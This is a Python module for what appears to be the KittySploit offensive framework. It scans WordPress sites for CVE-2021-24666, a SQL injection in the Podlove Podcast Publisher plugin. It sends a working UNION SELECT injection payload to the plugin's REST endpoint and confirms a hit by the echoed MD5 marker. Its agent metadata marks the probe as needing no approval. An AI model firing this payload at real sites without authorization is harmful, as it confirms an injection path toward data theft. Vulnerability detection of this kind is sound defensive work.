#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Podlove Podcast Publisher plugin before 3."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Podlove Podcast Publisher <3.5.6 - SQL Injection Detection',
        'description': 'WordPress Podlove Podcast Publisher plugin before 3.5.6 is susceptible to SQL injection. The Social & Donations module, not activated by default, adds the REST route /services/contributor/(?P<id>[\\d]+) and takes id and category parameters as arguments. Both parameters can be exploited, thereby potentially enabling an attacker to obtain sensitive information, modify data, and/or execute unauthorized administrative operations.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web',
            'scanner',
            'cve',
            'cve2021',
            'sqli',
            'wordpress',
            'wp-plugin',
            'wp',
            'podlove-podcasting-plugin-for-wordpress',
            'wpscan',
            'podlove',
            'vkev',
            'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/fb4d7988-60ff-4862-96a1-80b1866336fe',
            'https://wordpress.org/plugins/podlove-podcasting-plugin-for-wordpress/',
            'https://github.com/podlove/podlove-publisher/commit/aa8a343a2e2333b34a422f801adee09b020c6d76',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-24666',
        ],
        'cve': 'CVE-2021-24666',
    }

    def run(self):
        r = self.http_request(method="GET", path="/index.php?rest_route=/podlove/v1/social/services/contributor/1&id=1%20UNION%20ALL%20SELECT%20NULL,NULL,md5('CVE-2021-24666'),NULL,NULL,NULL--%20-", allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('66a82937a7660b73b00d4f7cefee6c85', '"service_id"',)
        header_any = ('application/json',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='critical',
                reason="WordPress Podlove Podcast Publisher <3.5.6 - SQL Injection detected",
                path="/index.php?rest_route=/podlove/v1/social/services/contributor/1&id=1%20UNION%20ALL%20SELECT%20NULL,NULL,md5('CVE-2021-24666'),NULL,NULL,NULL--%20-",
            )
            return True
        return False

